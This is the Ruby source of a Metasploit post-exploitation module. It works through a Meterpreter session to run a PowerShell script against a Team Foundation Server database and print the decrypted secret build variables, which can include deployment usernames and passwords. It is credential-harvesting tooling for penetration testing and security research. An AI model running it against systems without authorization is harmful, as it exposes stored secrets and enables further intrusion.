require 'msf/core/post/common'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell
  include Msf::Exploit::Powershell
  include Msf::Post::Common
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'TFS secret variables decryptor',
      'Description' => %q{
        It is possible within Team Foundation Server to store variables with encrypted content. Use cases for this
        can vary from secretive information or username and password to deploy builds. The decryption key for these values is encrypted
        with another key which is stored in the same database. This module uses a script to query and decrypt the secret variables.
        Integrated authentication will be used unless DBA_USERNAME and DBA_PASSWORD are specified.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Rindert Kramer <rindert.kramer[at]fox-it.com>',
        ],
        'References'  =>
        [
          ['URL', 'https://lowleveldesign.org/2017/07/04/decrypting-tfs-secret-variables/'],
          ['URL', 'https://blog.fox-it.com/']
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter']))

    register_options(
      [
        OptString.new('SQLSERVER', [true, 'Name of database server']),
        OptString.new('DATABASE', [true, 'Name of TFS database','Tfs_DefaultCollection']),
        OptString.new('DBA_USERNAME', [false, 'Username to connect to MSSQL']),
        OptString.new('DBA_PASSWORD', [false, 'Password to connect to MSSQL']),
        OptInt.new('SCRIPT_TIMEOUT', [true, 'Script timeout', 120]),
      ]
    )
  end

  def run
    # read values from datastore
    sql_server = datastore['SQLSERVER']
    database = datastore['DATABASE']
    dba_username = datastore['DBA_USERNAME']
    dba_password = datastore['DBA_PASSWORD']
    script_timeout = datastore['SCRIPT_TIMEOUT']

    if !have_powershell?
      print_error('PowerShell is not installed! STOPPING')
      return
    end

    # Read script, replace placeholders with parameters
    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Decrypt-TFSSecretVariables.ps1"))
    base_script.gsub! '__db_server__', sql_server
    base_script.gsub! '__database__', database
    base_script.gsub! '__dba_username__', dba_username.to_s()
    base_script.gsub! '__dba_password__', dba_password.to_s()

    eof = Rex::Text.rand_text_alpha(8)
    cmd_out, _running_pids, _open_channels = execute_script(base_script, script_timeout)
    ps_output = get_ps_output(cmd_out, eof, script_timeout)

    # Extract values from output with regex
    regex = /^\[\*\](?<varname>.+)\s\[\+\](?<value>.+)$/
    ps_output.scan(regex).each do |success|
      print_good("")
      print_good("Variable: #{success[0]}")
      print_good("Decrypted value: #{success[1]}")
    end
  end
end
